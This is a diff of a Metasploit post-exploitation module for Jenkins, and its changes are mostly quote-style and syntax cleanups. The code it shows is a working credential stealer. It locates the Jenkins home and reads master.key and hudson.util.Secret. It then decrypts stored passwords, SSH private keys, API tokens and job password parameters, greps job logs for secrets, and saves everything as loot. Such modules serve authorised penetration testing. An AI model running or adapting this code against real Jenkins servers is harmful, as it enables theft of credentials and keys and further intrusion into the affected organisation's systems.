@@ -49,7 +49,7 @@ class MetasploitModule < Msf::Post
 
     credential_data = {
       origin_type: :session,
-      post_reference_name: self.fullname,
+      post_reference_name: fullname,
       private_data: pass,
       private_type: :password,
       session_id: session_db_id,
@@ -61,7 +61,7 @@ class MetasploitModule < Msf::Post
   end
 
   def parse_credentialsxml(file)
-    vprint_status("Parsing credentials.xml...")
+    vprint_status('Parsing credentials.xml...')
     if exists?(file)
       f = read_file(file)
       if datastore['STORE_LOOT']
@@ -69,26 +69,26 @@ class MetasploitModule < Msf::Post
         vprint_status("File credentials.xml saved to #{loot_path}")
       end
     else
-      print_error("Could not read credentials.xml...")
+      print_error('Could not read credentials.xml...')
     end
 
     xml_doc = Nokogiri::XML(f)
-    xml_doc.xpath("//com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl").each do |node|
-      username = node.xpath("username").text
-      password = decrypt(node.xpath("password").text)
-      description = node.xpath("description").text
+    xml_doc.xpath('//com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl').each do |node|
+      username = node.xpath('username').text
+      password = decrypt(node.xpath('password').text)
+      description = node.xpath('description').text
       print_good("Credentials found - Username: #{username} Password: #{password}")
       report_creds(username, password)
       @creds << [username, password, description]
     end
 
-    xml_doc.xpath("//com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey").each do |node|
-      cred_id = node.xpath("id").text
-      username = node.xpath("username").text
-      description = node.xpath("description").text
-      passphrase = node.xpath("passphrase").text
+    xml_doc.xpath('//com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey').each do |node|
+      cred_id = node.xpath('id').text
+      username = node.xpath('username').text
+      description = node.xpath('description').text
+      passphrase = node.xpath('passphrase').text
       passphrase = decrypt(passphrase)
-      private_key = node.xpath("//privateKeySource//privateKey").text
+      private_key = node.xpath('//privateKeySource//privateKey').text
       private_key = decrypt(private_key) if !private_key.match?(/----BEGIN/)
       print_good("SSH Key found! ID: #{cred_id} Passphrase: #{passphrase || '<empty>'} Username: #{username} Description: #{description}")
 
@@ -101,7 +101,7 @@ class MetasploitModule < Msf::Post
         credential_data = {
           origin_type: :session,
           session_id: session_db_id,
-          post_reference_name: self.refname,
+          post_reference_name: refname,
           private_type: :ssh_key,
           private_data: key.key_object.to_s,
           username: cred_id,
@@ -116,18 +116,18 @@ class MetasploitModule < Msf::Post
 
   def parse_users(file)
     f = read_file(file)
-    fname = file.tr("\\", "/").split('/')[-2]
+    fname = file.tr('\\', '/').split('/')[-2]
     vprint_status("Parsing user #{fname}...")
 
-    username = ""
-    api_token = ""
+    username = ''
+    api_token = ''
     xml_doc = Nokogiri::XML(f)
-    xml_doc.xpath("//user").each do |node|
-      username = node.xpath("fullName").text
+    xml_doc.xpath('//user').each do |node|
+      username = node.xpath('fullName').text
     end
 
-    xml_doc.xpath("//jenkins.security.ApiTokenProperty").each do |node|
-      api_token = decrypt(node.xpath("apiToken").text)
+    xml_doc.xpath('//jenkins.security.ApiTokenProperty').each do |node|
+      api_token = decrypt(node.xpath('apiToken').text)
     end
 
     if api_token
@@ -140,24 +140,24 @@ class MetasploitModule < Msf::Post
 
   def parse_nodes(file)
     f = read_file(file)
-    fname = file.tr("\\", "/").split('/')[-2]
+    fname = file.tr('\\', '/').split('/')[-2]
     vprint_status("Parsing node #{fname}...")
 
-    node_name = ""
-    description = ""
-    host = ""
-    port = ""
-    cred_id = ""
+    node_name = ''
+    description = ''
+    host = ''
+    port = ''
+    cred_id = ''
     xml_doc = Nokogiri::XML(f)
-    xml_doc.xpath("//slave").each do |node|
-      node_name = node.xpath("name").text
-      description = node.xpath("description").text
+    xml_doc.xpath('//slave').each do |node|
+      node_name = node.xpath('name').text
+      description = node.xpath('description').text
     end
 
-    xml_doc.xpath("//launcher").each do |node|
-      host = node.xpath("host").text
-      port = node.xpath("port").text
-      cred_id = node.xpath("credentialsId").text
+    xml_doc.xpath('//launcher').each do |node|
+      host = node.xpath('host').text
+      port = node.xpath('port').text
+      cred_id = node.xpath('credentialsId').text
     end
 
     @nodes << [node_name, host, port, description, cred_id]
@@ -167,19 +167,19 @@ class MetasploitModule < Msf::Post
 
   def parse_jobs(file)
     f = read_file(file)
-    fname = file.tr("\\", "/").split('/')[-4]
+    fname = file.tr('\\', '/').split('/')[-4]
     vprint_status("Parsing job #{fname}...")
 
-    username = ""
-    pw = ""
-    job_name = file.split(/\/jobs\/(.*?)\/builds\//)[1]
+    username = ''
+    pw = ''
+    job_name = file.split(%r{/jobs/(.*?)/builds/})[1]
     xml_doc = Nokogiri::XML(f)
-    xml_doc.xpath("//hudson.model.PasswordParameterValue").each do |node|
-      username = node.xpath("name").text
-      pw = decrypt(node.xpath("value").text)
+    xml_doc.xpath('//hudson.model.PasswordParameterValue').each do |node|
+      username = node.xpath('name').text
+      pw = decrypt(node.xpath('value').text)
     end
 
-    @creds << [username, pw, ""]
+    @creds << [username, pw, '']
     print_good("Job Info found - Job Name: #{job_name} User: #{username} Password: #{pw}") if !pw.blank?
     store_loot("job-#{fname}", 'text/plain', session, f, nil, nil) if datastore['STORE_LOOT']
   end
@@ -229,24 +229,24 @@ class MetasploitModule < Msf::Post
     store_loot('all.nodes.csv', 'text/plain', session, node_table.to_csv, nil, nil) if datastore['STORE_LOOT']
 
     @ssh_keys.uniq.each do |e|
-      print_good("SSH Key")
+      print_good('SSH Key')
       print_status(" ID: #{e[0]}")
       print_status(" Description: #{e[1]}") if !e[1].blank?
       print_status(" Passphrase:  #{e[2]}") if !e[2].blank?
       print_status(" Username:    #{e[3]}") if !e[3].blank?
       print_status("\n#{e[4]}")
     end
-    ssh_output = @ssh_keys.each { |e| e.join(",") + "\n\n\n" }
+    ssh_output = @ssh_keys.each { |e| e.join(',') + "\n\n\n" }
     store_loot('all.sshkeys', 'text/plain', session, ssh_output, nil, nil) if datastore['STORE_LOOT'] && !ssh_output.empty?
   end
 
   def grep_job_history(path, platform)
-    print_status("Searching through job history for interesting keywords...")
+    print_status('Searching through job history for interesting keywords...')
     case platform
-    when "windows"
-      results = cmd_exec("cmd.exe", "/c findstr /s /i \"secret key token password\" \"#{path}*log\"")
+    when 'windows'
+      results = cmd_exec('cmd.exe', "/c findstr /s /i \"secret key token password\" \"#{path}*log\"")
     when 'nix'
-      results = cmd_exec("/bin/egrep", "-ir \"password|secret|key\" --include log \"#{path}\"")
+      results = cmd_exec('/bin/egrep', "-ir \"password|secret|key\" --include log \"#{path}\"")
     end
     store_loot('jobhistory.truffles', 'text/plain', session, results, nil, nil) if datastore['STORE_LOOT'] && !results.empty?
     print_good("Job Log truffles:\n#{results}") if !results.empty?
@@ -258,12 +258,12 @@ class MetasploitModule < Msf::Post
     when 'windows'
       case session.type
       when 'meterpreter'
-        configs = ""
-        c = session.fs.file.search(path, "config.xml", true, -1) \
-                   .concat(session.fs.file.search(path, "build.xml", true, -1))
-        c.each { |f| configs << f["path"] + "\\" + f["name"] + "\n" }
+        configs = ''
+        c = session.fs.file.search(path, 'config.xml', true, -1) \
+                   .concat(session.fs.file.search(path, 'build.xml', true, -1))
+        c.each { |f| configs << f['path'] + '\\' + f['name'] + "\n" }
       else
-        configs = cmd_exec("cmd.exe", "/c dir /b /s \"#{path}\\*config.xml\" \"#{path}\\*build.xml\"")
+        configs = cmd_exec('cmd.exe', "/c dir /b /s \"#{path}\\*config.xml\" \"#{path}\\*build.xml\"")
       end
       configs.split("\n").each do |f|
         case f
@@ -277,14 +277,14 @@ class MetasploitModule < Msf::Post
       end
 
     when 'nix'
-      configs = cmd_exec("/usr/bin/find", "\"#{path}\" -name config.xml -o -name build.xml")
+      configs = cmd_exec('/usr/bin/find', "\"#{path}\" -name config.xml -o -name build.xml")
       configs.split("\n").each do |f|
         case f
-        when /\/users\//
+        when %r{/users/}
           parse_users(f)
-        when /\/jobs\//
+        when %r{/jobs/}
           parse_jobs(f)
-        when /\/nodes\//
+        when %r{/nodes/}
           parse_nodes(f)
         end
       end
@@ -293,10 +293,10 @@ class MetasploitModule < Msf::Post
 
   def get_key_material(home, platform)
     case platform
-    when "windows"
+    when 'windows'
       master_key_path = "#{home}\\secrets\\master.key"
       hudson_secret_key_path = "#{home}\\secrets\\hudson.util.Secret"
-    when "nix"
+    when 'nix'
       master_key_path = "#{home}/secrets/master.key"
       hudson_secret_key_path = "#{home}/secrets/hudson.util.Secret"
     end
@@ -312,45 +312,45 @@ class MetasploitModule < Msf::Post
         vprint_status("File hudson.util.Secret saved to #{loot_path}")
       end
     else
-      print_error "Cannot read master.key or hudson.util.Secret..."
-      print_error "Encrypted strings will not be able to be decrypted..."
+      print_error 'Cannot read master.key or hudson.util.Secret...'
+      print_error 'Encrypted strings will not be able to be decrypted...'
       return
     end
   end
 
   def find_home(platform)
-    print_status("Searching for Jenkins directory... This could take some time...")
+    print_status('Searching for Jenkins directory... This could take some time...')
     case platform
-    when "windows"
+    when 'windows'
       case session.type
       when 'meterpreter'
-        home = session.fs.file.search(nil, "secret.key.not-so-secret")[0]["path"]
+        home = session.fs.file.search(nil, 'secret.key.not-so-secret')[0]['path']
       else
-        home = cmd_exec("cmd.exe", "/c dir /b /s c:\*secret.key.not-so-secret", timeout = 120).split("\\")[0..-2].join("\\").strip
+        home = cmd_exec('cmd.exe', "/c dir /b /s c:\*secret.key.not-so-secret", timeout = 120).split('\\')[0..-2].join('\\').strip
       end
-    when "nix"
-      home = cmd_exec("find", "/ -name 'secret.key.not-so-secret' 2>/dev/null", timeout = 120).split('/')[0..-2].join('/').strip
+    when 'nix'
+      home = cmd_exec('find', "/ -name 'secret.key.not-so-secret' 2>/dev/null", timeout = 120).split('/')[0..-2].join('/').strip
     end
-    fail_with(Failure::NotFound, "No Jenkins installation found or readable, exiting...") if !exist?(home)
+    fail_with(Failure::NotFound, 'No Jenkins installation found or readable, exiting...') if !exist?(home)
     print_status("Found Jenkins installation at #{home}")
     home
   end
 
   def gathernix
-    home = find_home("nix")
-    get_key_material(home, "nix")
+    home = find_home('nix')
+    get_key_material(home, 'nix')
     parse_credentialsxml(home + '/credentials.xml')
-    find_configs(home, "nix")
-    grep_job_history(home + '/jobs/', "nix") if datastore['SEARCH_JOBS']
+    find_configs(home, 'nix')
+    grep_job_history(home + '/jobs/', 'nix') if datastore['SEARCH_JOBS']
     pretty_print_gathered
   end
 
   def gatherwin
-    home = find_home("windows")
-    get_key_material(home, "windows")
-    parse_credentialsxml(home + "\\credentials.xml")
-    find_configs(home, "windows")
-    grep_job_history(home + "\\jobs\\", "windows") if datastore['SEARCH_JOBS']
+    home = find_home('windows')
+    get_key_material(home, 'windows')
+    parse_credentialsxml(home + '\\credentials.xml')
+    find_configs(home, 'windows')
+    grep_job_history(home + '\\jobs\\', 'windows') if datastore['SEARCH_JOBS']
     pretty_print_gathered
   end
 
@@ -378,61 +378,58 @@ class MetasploitModule < Msf::Post
   end
 
   def decrypt_v2(encrypted)
-    begin
-      master_key = @master_key
-      hudson_secret_key = @hudson_secret_key
-      key = decrypt_key(master_key, hudson_secret_key)
-      encrypted_text = Base64.decode64(encrypted).bytes
+    master_key = @master_key
+    hudson_secret_key = @hudson_secret_key
+    key = decrypt_key(master_key, hudson_secret_key)
+    encrypted_text = Base64.decode64(encrypted).bytes
 
-      iv_length = ((encrypted_text[1] & 0xff) << 24) | ((encrypted_text[2] & 0xff) << 16) | ((encrypted_text[3] & 0xff) << 8) | (encrypted_text[4] & 0xff)
-      data_length = ((encrypted_text[5] & 0xff) << 24) | ((encrypted_text[6] & 0xff) << 16) | ((encrypted_text[7] & 0xff) << 8) | (encrypted_text[8] & 0xff)
-      if encrypted_text.length != (1 + 8 + iv_length + data_length)
-        print_error("Invalid encrypted string: #{encrypted}")
-      end
-      iv = encrypted_text[9..(9 + iv_length)].pack('C*')[0..15]
-      code = encrypted_text[(9 + iv_length)..encrypted_text.length].pack('C*').force_encoding('UTF-8')
-
-      cipher = OpenSSL::Cipher.new('AES-128-CBC')
-      cipher.decrypt
-      cipher.key = key
-      cipher.iv = iv
-
-      text = cipher.update(code) + cipher.final
-      text = Digest::MD5.new.update(text).hexdigest if text.length == 32 # Assuming token
-      text
-    rescue StandardError => e
-      print_error(e.to_s)
-      return "Could not decrypt string"
+    iv_length = ((encrypted_text[1] & 0xff) << 24) | ((encrypted_text[2] & 0xff) << 16) | ((encrypted_text[3] & 0xff) << 8) | (encrypted_text[4] & 0xff)
+    data_length = ((encrypted_text[5] & 0xff) << 24) | ((encrypted_text[6] & 0xff) << 16) | ((encrypted_text[7] & 0xff) << 8) | (encrypted_text[8] & 0xff)
+    if encrypted_text.length != (1 + 8 + iv_length + data_length)
+      print_error("Invalid encrypted string: #{encrypted}")
     end
+    iv = encrypted_text[9..(9 + iv_length)].pack('C*')[0..15]
+    code = encrypted_text[(9 + iv_length)..encrypted_text.length].pack('C*').force_encoding('UTF-8')
+
+    cipher = OpenSSL::Cipher.new('AES-128-CBC')
+    cipher.decrypt
+    cipher.key = key
+    cipher.iv = iv
+
+    text = cipher.update(code) + cipher.final
+    text = Digest::MD5.new.update(text).hexdigest if text.length == 32 # Assuming token
+    text
+  rescue StandardError => e
+    print_error(e.to_s)
+    return 'Could not decrypt string'
   end
 
   def decrypt_legacy(encrypted)
     # https://gist.github.com/juyeong/081379bd1ddb3754ed51ab8b8e535f7c
-    begin
-      magic = '::::MAGIC::::'
-      master_key = @master_key
-      hudson_secret_key = @hudson_secret_key
-      encrypted = Base64.decode64(encrypted)
 
-      key = decrypt_key(master_key, hudson_secret_key)
-      cipher = OpenSSL::Cipher.new('AES-128-ECB')
-      cipher.decrypt
-      cipher.key = key
+    magic = '::::MAGIC::::'
+    master_key = @master_key
+    hudson_secret_key = @hudson_secret_key
+    encrypted = Base64.decode64(encrypted)
 
-      text = cipher.update(encrypted) + cipher.final
-      text = text[0..(text.length - magic.size - 1)]
-      text = Digest::MD5.new.update(text).hexdigest if text.length == 32 # Assuming token
-      text
-    rescue StandardError => e
-      print_error(e.to_s)
-      return "Could not decrypt string"
-    end
+    key = decrypt_key(master_key, hudson_secret_key)
+    cipher = OpenSSL::Cipher.new('AES-128-ECB')
+    cipher.decrypt
+    cipher.key = key
+
+    text = cipher.update(encrypted) + cipher.final
+    text = text[0..(text.length - magic.size - 1)]
+    text = Digest::MD5.new.update(text).hexdigest if text.length == 32 # Assuming token
+    text
+  rescue StandardError => e
+    print_error(e.to_s)
+    return 'Could not decrypt string'
   end
 
   def decrypt(encrypted)
     return if encrypted.empty?
 
-    if encrypted[0] == "{" && encrypted[-1] == "}"
+    if encrypted[0] == '{' && encrypted[-1] == '}'
       decrypt_v2(encrypted)
     else
       decrypt_legacy(encrypted)
